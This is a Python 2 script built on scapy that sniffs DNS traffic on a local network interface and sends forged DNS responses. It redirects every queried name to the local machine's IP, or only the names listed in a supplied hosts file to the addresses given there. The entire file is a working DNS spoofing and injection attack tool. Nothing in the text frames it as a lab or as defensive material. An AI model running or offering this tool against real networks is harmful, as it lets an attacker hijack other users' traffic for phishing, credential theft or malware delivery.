from scapy.all import *
import sys, getopt
import netifaces


def callback(dict, local_ip):
    def get_response(pkt):
        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != local_ip:
            if len(dict) == 0:
                if str(pkt['DNS Question Record'].qname):
                    spoofed_packet = IP(dst=pkt[IP].src) \
                                     / UDP(dport=pkt[UDP].sport, sport=53) \
                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip))
                    send(spoofed_packet, verbose=0)
                return 'Spoofed DNS Response Sent'
            else:
                qn = str(pkt['DNS Question Record'].qname)
                if qn and qn in dict:
                    new_ip = dict[qn]
                    spoofed_packet = IP(dst=pkt[IP].src) \
                                     / UDP(dport=pkt[UDP].sport, sport=53) \
                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=new_ip))
                    send(spoofed_packet, verbose=0)
        else:
            return 'hello'

    return get_response


def get_local_ip(interface_name):
    return netifaces.ifaddresses(interface_name)[netifaces.AF_INET][0]['addr'].encode("UTF-8")


def parse_args(argv):
    hosts_file = ''
    interface_name = ''
    try:
        opts, args = getopt.getopt(argv, "h:i:")
    except getopt.GetoptError:
        print 'Incorrect format of args. Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    l = len(args)
    if l > 1:
        print 'Too many arguments.  Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    if l < 1:
        print 'Too many arguments.  Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            hosts_file = arg
        elif opt == "-i":
            interface_name = arg

    return hosts_file, interface_name, args[0]


def get_fallback_default_interface():
    return netifaces.interfaces()[0]


def get_default_interface():
    gateways = netifaces.gateways()
    if not gateways:
        return get_fallback_default_interface()
    def_gateway = gateways['default']
    if not def_gateway:
        return get_fallback_default_interface()
    return def_gateway[netifaces.AF_INET][1].encode("UTF-8")


def main(argv):
    dict = {}
    hosts_file, interface_name, bpf_expr = parse_args(argv)
    if hosts_file is not '':
        try:
            with open(hosts_file) as f:
                for line in f:
                    ip, url = line.partition(" ")[::2]
                    dict[url.strip()] = ip.strip()
            print "Dict is " + str(dict)
        except OSError:
            print('Error in opening host_mapping file:' + hosts_file);
            sys.exit(2)

    bpf_filt = 'udp port 53' if (bpf_expr is '') else bpf_expr
    # interface = get_default_interface() if interface_name is '' else interface_name
    interface = get_default_interface()
    sniff(filter=bpf_filt, prn=callback(dict, get_local_ip(interface)))


if __name__ == "__main__":
    main(sys.argv[1:])
